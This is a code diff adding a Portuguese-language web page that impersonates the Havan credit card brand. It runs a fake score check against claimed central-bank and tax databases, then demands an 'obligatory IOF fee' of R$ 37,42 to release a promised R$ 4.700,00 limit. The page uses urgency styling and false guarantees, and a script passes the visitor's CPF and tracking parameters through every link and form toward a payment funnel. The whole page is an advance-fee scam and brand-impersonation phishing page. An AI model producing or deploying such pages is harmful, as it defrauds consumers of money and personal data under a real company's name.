@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Havan Card - Regularização de Score e IOF</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        .urgency-badge {
+            background: #e74c3c;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 15px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .guarantee-box {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            font-size: 13px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen">
+        <div class="loading-container">
+            <div class="havan-logo">
+                <div class="logo-circle">
+                    <span class="logo-text">H</span>
+                </div>
+                <h2>HAVAN</h2>
+            </div>
+            
+            <div class="loading-content">
+                <h3>Verificando seu Score</h3>
+                <p>Consultando bases de dados do Banco Central e Receita Federal...</p>
+                
+                <div class="progress-steps">
+                    <div class="step" id="step1">
+                        <div class="step-icon">
+                            <i class="fas fa-search"></i>
+                        </div>
+                        <div class="step-text">
+                            <span class="step-title">Consulta de Score</span>
+                            <span class="step-status" id="status1">Processando...</span>
+                        </div>
+                        <div class="step-loader" id="loader1">
+                            <div class="spinner"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="step" id="step2">
+                        <div class="step-icon">
+                            <i class="fas fa-file-invoice-dollar"></i>
+                        </div>
+                        <div class="step-text">
+                            <span class="step-title">Cálculo de Tributos</span>
+                            <span class="step-status" id="status2">Aguardando...</span>
+                        </div>
+                        <div class="step-loader" id="loader2">
+                            <div class="spinner"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="step" id="step3">
+                        <div class="step-icon">
+                            <i class="fas fa-exclamation-triangle"></i>
+                        </div>
+                        <div class="step-text">
+                            <span class="step-title">Status de Liberação</span>
+                            <span class="step-status" id="status3">Aguardando...</span>
+                        </div>
+                        <div class="step-loader" id="loader3">
+                            <div class="spinner"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Upsell Screen -->
+    <div id="upsellScreen" class="upsell-screen" style="display: none;">
+        <div class="upsell-container">
+            <div class="header">
+                <div class="havan-brand">
+                    <div class="brand-logo">
+                        <span>H</span>
+                    </div>
+                    <span class="brand-name">HAVAN</span>
+                </div>
+            </div>
+            
+            <div class="upsell-content">
+                <div class="text-center" style="text-align: center;">
+                    <span class="urgency-badge">PENDÊNCIA IDENTIFICADA</span>
+                    <h2 style="color: #1a237e; margin-bottom: 10px;">Atenção! Notamos que seu score está abaixo do necessário.</h2>
+                    <p style="color: #666; margin-bottom: 25px;">Para prosseguir com a liberação do seu limite, será necessário realizar o pagamento do <strong>IOF antecipadamente</strong>.</p>
+                </div>
+
+                <div class="alert-section" style="background: #fff3e0; border-color: #ff9800;">
+                    <div class="alert-icon" style="color: #f57c00;">
+                        <i class="fas fa-exclamation-circle"></i>
+                    </div>
+                    <div class="alert-text">
+                        <h2 style="color: #e65100;">Por que pagar o IOF agora?</h2>
+                        <p style="color: #bf360c;">Devido ao seu score atual, o sistema de crédito exige a garantia do Imposto sobre Operações Financeiras (IOF) para validar a transação de abertura de crédito. Este é um procedimento padrão de segurança.</p>
+                    </div>
+                </div>
+                
+                <div class="price-section">
+                    <div class="price-box">
+                        <span class="price-label">Taxa de IOF Obrigatória:</span>
+                        <span class="price-value">R$ 37,42</span>
+                    </div>
+                    <p class="price-note">Valor referente à regularização tributária para liberação do limite</p>
+                </div>
+                
+                <div class="benefits-section">
+                    <h4 style="text-align: center; margin-bottom: 20px;">Após o pagamento do IOF:</h4>
+                    <div class="benefits-list">
+                        <div class="benefit">
+                            <i class="fas fa-chart-line"></i>
+                            <span><strong>Aumento de Score:</strong> Seu score será atualizado internamente na Havan.</span>
+                        </div>
+                        <div class="benefit">
+                            <i class="fas fa-unlock-alt"></i>
+                            <span><strong>Desbloqueio Imediato:</strong> Seu limite de R$ 4.700,00 será liberado na hora.</span>
+                        </div>
+                        <div class="benefit">
+                            <i class="fas fa-check-double"></i>
+                            <span><strong>Validação Final:</strong> Conclusão de todas as etapas de aprovação.</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="account-payment-btn" onclick="window.location.href='/funil/pos/up4check/'+window.location.search">
+                    <i class="fas fa-shield-alt"></i>
+                    PAGAR IOF E LIBERAR MEU LIMITE
+                </button>
+                
+                <div class="guarantee-box">
+                    <i class="fas fa-shield-check" style="font-size: 24px; color: #4caf50;"></i>
+                    <span><strong>Garantia Havan:</strong> Processamento seguro e imediato. Seus dados estão protegidos pela LGPD.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script defer src="script.js"></script>
+
+<script>
+(function() {
+    function updateAllLinksAndForms() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const utms = {};
+        urlParams.forEach((value, key) => {
+            if (key.startsWith('utm_') || key === 'cpf' || key === 'fbclid' || key === 'gclid') {
+                utms[key] = value;
+            }
+        });
+
+        if (Object.keys(utms).length === 0) return;
+
+        document.querySelectorAll('a').forEach(link => {
+            try {
+                const href = link.getAttribute('href');
+                if (!href || href.startsWith('#') || href.startsWith('javascript:')) return;
+                
+                let url;
+                try {
+                    url = new URL(href, window.location.origin);
+                } catch(e) {
+                    const separator = href.includes('?') ? '&' : '?';
+                    const linkParams = new URLSearchParams();
+                    Object.keys(utms).forEach(key => linkParams.set(key, utms[key]));
+                    link.href = href + separator + linkParams.toString();
+                    return;
+                }
+
+                if (url.origin === window.location.origin || href.startsWith('.') || href.startsWith('/')) {
+                    const linkParams = new URLSearchParams(url.search);
+                    Object.keys(utms).forEach(key => linkParams.set(key, utms[key]));
+                    url.search = linkParams.toString();
+                    link.href = url.toString();
+                }
+            } catch (e) {}
+        });
+
+        document.querySelectorAll('form').forEach(form => {
+            Object.keys(utms).forEach(key => {
+                let input = form.querySelector(`input[name="${key}"]`);
+                if (!input) {
+                    input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    form.appendChild(input);
+                }
+                input.value = utms[key];
+            });
+        });
+    }
+
+    updateAllLinksAndForms();
+    window.addEventListener('load', updateAllLinksAndForms);
+    document.addEventListener('DOMContentLoaded', updateAllLinksAndForms);
+    const observer = new MutationObserver(updateAllLinksAndForms);
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+})();
+</script>
+
+</body>
+</html>
